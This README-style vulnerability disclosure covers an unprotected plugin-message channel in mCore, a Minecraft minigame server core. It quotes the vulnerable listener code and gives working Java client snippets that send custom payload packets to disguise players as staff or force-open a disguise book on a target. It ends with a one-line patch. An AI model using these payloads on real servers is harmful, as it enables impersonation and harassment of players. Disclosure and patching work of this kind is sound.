README Based on https://github.com/ParadoxLegit/Skinsrestorer-Exploit

### Details:
Severity: Medium

Discovery Date: 21 January, 2021

Public 22 January, 2021

### Vulnerability Scope
This vulnerability affects all servers running mCore, which is a minigame server core.

### Description
mCore using the plugin channel mCore with the following possible subchannels:

-FAKE : allows you to disguise any player as any name and 'role' which are ranks.
-FAKE_BOOK : allows you to open the disguise book, spamming this on a player can effectively freeze them
-FAKE_BOOK2 : doesn't work
-PARTY : allows you to control all parties on the server

###Reproduction

```java
          Player player = Bukkit.getPlayerExact(in.readUTF());
          if (player != null) {
            String fakeName = in.readUTF();
            String roleName = in.readUTF();
            String skin = in.readUTF();
            FakeManager.applyFake(player, fakeName, roleName, skin);
            NMS.refreshPlayer(player);
          }
```
These channels don't have any protection on them at all, so all you have to do is send a custom payload with 5 utfs in it. The code for chaning their disguise is:
```java
     try {
     	ByteArrayOutputStream b = new ByteArrayOutputStream();
     	DataOutputStream out = new DataOutputStream(b);
     	out.writeUTF("FAKE"); // Subchannel
     	out.writeUTF("Notch"); // Your name
     	out.writeUTF("Owner"); // Fake name
     	out.writeUTF("admin"); // Fake rank
     	out.writeUTF("Owner"); // Fake skin
     	PacketBuffer buf = new PacketBuffer(Unpooled.buffer());
     	buf.writeBytes(b.toByteArray());
     	Wrapper.mc.thePlayer.sendQueue.addToSendQueueNoEvent(new C17PacketCustomPayload("mCore", buf));
     } catch (IOException e) {}
```

This is the code listening for the disguise book:
```java
          Player player = Bukkit.getPlayerExact(in.readUTF());
          if (player != null) {
            try {
              String sound = in.readUTF();
              EnumSound.valueOf(sound).play(player, 1.0F, sound.contains("VILL") ? 1.0F : 2.0F);
            } catch (Exception ignore) {}
            FakeManager.sendRole(player);
          }
```
The code to open the gui for anyone is this:
```java
      try {
      	ByteArrayOutputStream b = new ByteArrayOutputStream();
	DataOutputStream out = new DataOutputStream(b);
	out.writeUTF("FAKE_BOOK"); // Subchannel
	out.writeUTF("Notch"); // Target's name
	PacketBuffer buf = new PacketBuffer(Unpooled.buffer());
	buf.writeBytes(b.toByteArray());
	Wrapper.mc.thePlayer.sendQueue.addToSendQueueNoEvent(new C17PacketCustomPayload("mCore", buf));
      } catch (IOException e) {}
```
### Mitigation
This can easily be patched by adding:
```Java
if(!(event.getSender() instanceof ProxiedPlayer) && channel.equals("mCore")) { 
```
on line 27 of the PluginMessageListener class.
Since this exploit is basically harmless, other than the fact the attacker can impersonate anyone they want, I recommend downloading the plugin and adding the previous stated code and recompling it until the issue get's fixed by the developer
### Showcase

- https://www.youtube.com/watch?v=
